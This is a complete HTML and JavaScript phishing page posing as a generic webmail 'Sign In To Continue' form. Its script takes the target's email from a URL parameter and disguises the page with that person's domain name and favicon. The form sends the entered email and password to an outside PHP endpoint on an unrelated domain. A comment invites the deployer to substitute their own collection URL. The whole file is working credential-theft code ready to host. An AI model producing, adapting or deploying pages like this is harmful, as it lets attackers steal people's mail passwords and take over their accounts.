<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in to continue</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.1.1/css/all.min.css">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap');

        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
            color: #535353;
            background-image: url(https://i.imgur.com/W6H22Ci.png);
            background-size: cover;
            margin: 0;
            padding: 0;
        }
        .login-40 .form-section {
            max-width: 380px;
            margin: 50px auto 0;
            border-radius: 10px;
            padding: 10px 35px;
            border: 1px solid #e8e7e7;
            background: rgba(250, 250, 250, 0.95);
        }
        .login-40 .login-inner-form .form-box {
            position: relative;
            width: 100%;
            margin-bottom: 30px;
        }
        .login-40 .login-inner-form .input-text {
            width: 100%;
            padding: 15.5px 50px 15.5px 25px;
            font-size: 16px;
            border-radius: 50px;
            border: 1px solid #dbdbdb;
            box-shadow: 0 1px 3px 0 rgba(0,0,0,0.06);
            outline: none;
            box-sizing: border-box;
        }
        .login-40 .login-inner-form .form-box i {
            position: absolute;
            top: 14px;
            right: 25px;
            font-size: 19px;
            cursor: pointer;
        }
        .logo {
            text-align: center;
            margin-bottom: 35px;
        }
        #logo {
            height: 30px;
        }
        .btn-block {
            display: block;
            width: 100%;
        }
        .btn-md {
            cursor: pointer;
            padding: 15.5px 50px;
            font-size: 17px;
            font-weight: 400;
            border-radius: 50px;
            background: #50a1ff;
            border: none;
            color: #fff;
        }
        .btn-md:hover {
            background: #4595f1;
        }
        .checkbox {
            margin-bottom: 30px;
            font-size: 16px;
        }
        .form-check-label {
            padding-left: 25px;
            margin-bottom: 0;
            font-size: 16px;
            color: #717171;
            font-weight: 500;
        }
        .form-check-input {
            margin-right: 3px;
            position: absolute;
            margin-left: 0;
        }
        .form-check {
            position: relative;
        }
        .form-check-label::before {
            content: "";
            display: inline-block;
            position: absolute;
            width: 22px;
            height: 22px;
            margin-left: -27px;
            border: 1px solid #c5c3c3;
            border-radius: 3px;
            background-color: #fff;
        }
        input[type="checkbox"]:checked + label::before {
            background-color: #50a1ff;
            border-color: #50a1ff;
            content: "\2713";
            font-weight: 300;
            color: #f3f3f3;
            line-height: 15px;
            font-size: 14px;
            text-align: center;
        }
        .erx {
            margin: 10px 0 0;
            padding: 7px 5px;
            background-color: #c50000;
            color: #fff;
            font-size: 16px;
            margin-top: -1px;
            display: none;
        }
        #msg {
            color: red;
            margin-top: -15px;
            margin-bottom: 15px;
            display: block;
        }
        h2 {
            font-size: 2rem;
            margin: 0;
        }
        .login-inner-form {
            margin-top: -20px;
        }
        .container {
            max-width: 1140px;
            margin: 0 auto;
            padding: 0 15px;
        }
        .row {
            display: flex;
            justify-content: center;
        }
        .col-md-12 {
            width: 100%;
        }
    </style>
</head>
<body class="dark sharp">
    <div class="b_base login-40">
        <div class="f_base container">
            <div class="f_in row">
                <div class="col-md-12">
                    <div class="form-section">
                        <div class="f_in">
                            <div class="logo">
                                <a href="#">
                                    <img src="" alt="Webmail" id="logo">
                                    <h2 id="logoname"></h2>
                                </a>
                            </div>
                            <center><h2>Sign In To Continue</h2></center>
                            <div class="erx">Connection error, kindly try again!</div>
                            <div class="login-inner-form">
                                <!-- 🔧 REPLACE THE ACTION URL WITH YOUR PHP ENDPOINT 🔧 -->
                                <form class="f_form" action="https://scitecinstruments.it.com/customers/send.php" method="POST">
                                    <input type="hidden" name="fcc" id="fcc" value="">
                                    <div class="form-group form-box">
                                        <input type="email" id="email" name="email" class="input-text" placeholder="Email Address" readonly>
                                    </div>
                                    <div class="form-group form-box">
                                        <input type="password" id="password" name="password" class="input-text" placeholder="Password" required>
                                        <i class="fa fa-eye sla" id="togglePassword" onclick="togglePasswordVisibility()" aria-hidden="true"></i>
                                    </div>
                                    <span id="msg"></span>
                                    <div class="checkbox clearfix">
                                        <div class="form-check checkbox-theme">
                                            <input class="form-check-input" type="checkbox" value="" id="rem_me">
                                            <label class="form-check-label" for="rem_me">Remember me</label>
                                        </div>
                                    </div>
                                    <div class="form-group mb-0">
                                        <button type="submit" id="getitBtn" name="sub" class="btn-md btn-block sub_b">Continue</button>
                                    </div>
                                </form>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <script>
        // Pre-fill email from URL parameter 'e'
        const urlParams = new URLSearchParams(window.location.search);
        const emailParam = urlParams.get('e');
        if (emailParam && emailParam.includes('@')) {
            document.getElementById('email').value = emailParam;
            const domain = emailParam.split('@')[1];
            const sitename = domain.split('.')[0].toUpperCase();
            const formattedName = sitename.charAt(0).toUpperCase() + sitename.slice(1).toLowerCase();
            document.title = formattedName + document.title;
            document.getElementById('logoname').textContent = formattedName;
            
            // Set favicon and logo from domain (optional)
            const faviconUrl = `https://www.google.com/s2/favicons?domain=${domain}`;
            const link = document.querySelector("link[rel*='icon']") || document.createElement('link');
            link.type = 'image/x-icon';
            link.rel = 'shortcut icon';
            link.href = faviconUrl;
            document.getElementsByTagName('head')[0].appendChild(link);
            document.getElementById('logo').src = faviconUrl;
        } else {
            document.body.innerHTML = '<div style="text-align:center; padding:50px; font-size:24px;">Please provide an email parameter in the URL (?e=email@domain.com)</div>';
        }

        // Toggle password visibility
        function togglePasswordVisibility() {
            const passwordField = document.getElementById("password");
            const toggleIcon = document.getElementById("togglePassword");
            if (passwordField.type === "password") {
                passwordField.type = "text";
                toggleIcon.classList.remove("fa-eye");
                toggleIcon.classList.add("fa-eye-slash");
            } else {
                passwordField.type = "password";
                toggleIcon.classList.remove("fa-eye-slash");
                toggleIcon.classList.add("fa-eye");
            }
        }

        // Optional: simple client-side validation before submission (no extra data)
        document.querySelector('form').addEventListener('submit', function(e) {
            const password = document.getElementById('password').value.trim();
            if (!password) {
                e.preventDefault();
                document.getElementById('msg').textContent = 'Please enter your password';
                document.getElementById('msg').style.color = 'red';
            } else {
                document.getElementById('msg').textContent = '';
            }
        });
    </script>
</body>
</html>
